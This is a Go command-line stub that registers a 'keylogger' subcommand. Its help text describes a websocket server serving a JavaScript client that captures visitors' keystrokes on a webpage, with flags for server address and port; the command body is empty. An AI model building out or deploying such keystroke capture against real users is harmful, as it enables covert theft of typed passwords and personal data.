package cmd

import "github.com/spf13/cobra"

var wsAddr string
var listenerPort string
var KeyCmd = &cobra.Command{
	Use:   "keylogger",
	Short: "Run server to capture keystrokes from web client",
	Long: `This will run a keylogger server (a websocket) which also renders
	a HTML (with JS) client that captures the keystrokes and send them to
	this server, so we can know whatever the user is typing on that webpage`,
	Run: func(cmd *cobra.Command, args []string) {

	},
}

func init() {
	rootCmd.AddCommand(KeyCmd)
	KeyCmd.Flags().StringVarP(&wsAddr, "ws-addr", "w", "", "address of the websocket server")
	KeyCmd.Flags().StringVarP(&listenerPort, "listener-port", "l", "8195", `
	The port at which the listener server should run on this machine
	`)
}
